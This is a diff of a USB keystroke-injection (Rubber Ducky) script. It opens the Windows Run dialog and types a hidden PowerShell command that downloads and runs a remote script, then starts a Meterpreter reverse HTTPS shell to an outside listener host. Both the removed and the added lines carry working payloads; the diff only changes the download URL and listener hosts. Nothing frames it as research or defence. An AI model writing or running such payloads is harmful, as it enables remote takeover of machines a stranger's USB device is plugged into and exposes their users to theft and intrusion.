@@ -1,9 +1,10 @@
 DELAY 1500
 GUI r
 DELAY 250
-STRING cmd.exe /c powershell -windowstyle hidden "IEX (New-Object Net.WebClient).DownloadString('http://159.246.160.77/1/1.txt'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost bd1.ipsec.io -Lport 443 -force"
+STRING cmd.exe 
 ENTER
-GUI r
-DELAY 250
-STRING cmd.exe /c powershell -windowstyle hidden "IEX (New-Object Net.WebClient).DownloadString('http://159.246.160.77/1/1.txt'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost bd2.ipsec.io -Lport 443 -force"
+DELAY 1500
+STRING cmd.exe /c powershell -windowstyle hidden "IEX (New-Object Net.WebClient).DownloadString('https://www.occ.financial/ps/is.txt'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost host-96.ipsec.io -Lport 443 -force"
+ENTER
+STRING exit
 ENTER
